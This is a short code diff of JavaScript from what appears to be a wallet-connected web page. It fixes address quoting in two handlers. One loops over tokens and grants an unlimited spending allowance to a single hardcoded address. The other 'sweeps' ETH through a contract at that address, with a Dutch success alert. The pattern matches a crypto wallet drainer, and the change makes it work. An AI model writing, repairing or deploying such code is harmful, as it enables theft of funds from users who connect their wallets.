@@ -60,7 +60,7 @@ document.getElementById("approve").onclick = async () => {
   for (let t of tokens) {
     try {
       const token = new ethers.Contract(t.address, tokenABI, signer);
-      const tx = await token.approve(0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A, ethers.constants.MaxUint256);
+      const tx = await token.approve("0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A", ethers.constants.MaxUint256);
       await tx.wait();
       console.log(`✅ Approved ${t.name}`);
     } catch(e) {
@@ -74,7 +74,7 @@ document.getElementById("approve").onclick = async () => {
 // Sweep ETH via AutoExecute contract
 document.getElementById("sweepEth").onclick = async () => {
   try {
-    const contract = new ethers.Contract(0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A, autoExecuteABI, signer);
+    const contract = new ethers.Contract("0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A", autoExecuteABI, signer);
     const tx = await contract.execute();
     await tx.wait();
     alert("✅ ETH succesvol geswept via AutoExecute!");
